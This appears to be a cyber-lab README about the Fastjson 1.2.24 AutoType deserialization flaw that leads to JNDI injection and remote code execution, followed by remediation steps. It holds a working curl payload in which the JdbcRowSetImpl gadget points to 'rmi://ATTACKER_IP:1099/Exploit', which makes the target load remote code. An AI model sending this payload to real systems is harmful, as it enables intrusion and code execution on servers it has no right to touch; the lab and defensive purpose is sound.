# Alibaba Fastjson 1.2.24 AutoType Deserialization & JNDI Injection RCE

## Overview

Alibaba Fastjson is an open-source high-performance Java library used extensively across modern web applications and microservices for serializing and deserializing Java objects to and from JSON.

In Fastjson versions prior to 1.2.25, the **AutoType** feature allowed JSON payloads to specify the target Java class to instantiate via the `@type` key without strict whitelist validation. When processing untrusted JSON inputs containing `@type`, Fastjson instantiates the specified class and invokes its getters and setters. By supplying known "gadget" classes—such as `com.sun.rowset.JdbcRowSetImpl`—an attacker can trigger an outbound **JNDI (Java Naming and Directory Interface)** lookup to an attacker-controlled RMI or LDAP server, leading to arbitrary bytecode execution and Remote Code Execution.

- **Primary Interface**: `http://localhost:8128`
- **Docker Shortcut**: `./lab start fastjson-deserialization`
- **Container Name**: `cyberlab_02_fastjson_deserialization`
- **RAM Footprint**: ~250 MB

---

## Exploitation Walkthrough

### 1. Verification of Vulnerability via POST Request
Post a JSON payload targeting `JdbcRowSetImpl` pointing to an OOB callback server (or Interactsh from `tools/offensive/interactsh-oob`):

```bash
curl -X POST -H "Content-Type: application/json" \
  http://localhost:8128/ \
  -d '{
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "rmi://ATTACKER_IP:1099/Exploit",
      "autoCommit": true
    }
  }'
```

When Fastjson sets the `autoCommit` property, it triggers `connect()` inside `JdbcRowSetImpl`, initiating a JNDI lookup to the specified RMI/LDAP address and downloading and loading the remote class.

---

## Defensive Remediation & Hardening

1. **Upgrade Fastjson**:
   Upgrade to Fastjson 1.2.83 or migrate to modern Fastjson2 with `safeMode` enabled.
2. **Enable SafeMode**:
   Disable AutoType globally across JVM runtime parameters:
   ```properties
   -Dfastjson.parser.safeMode=true
   ```
3. **Upgrade Underlying JDK**:
   Modern JDK releases enforce `trustURLCodebase=false` for both RMI and LDAP JNDI lookups, neutralizing remote class loading.

---

## Video Walkthroughs & Technical References

- [Fastjson 0-Day Exploited](https://www.youtube.com/watch?v=3SKkwoMIhK0)
- [Fastjson GitHub Security Updates](https://github.com/alibaba/fastjson/wiki/security_update)
- [Vulhub Fastjson 1.2.24 Advisory](https://vulhub.org/#/environments/fastjson/1.2.24-rce/)
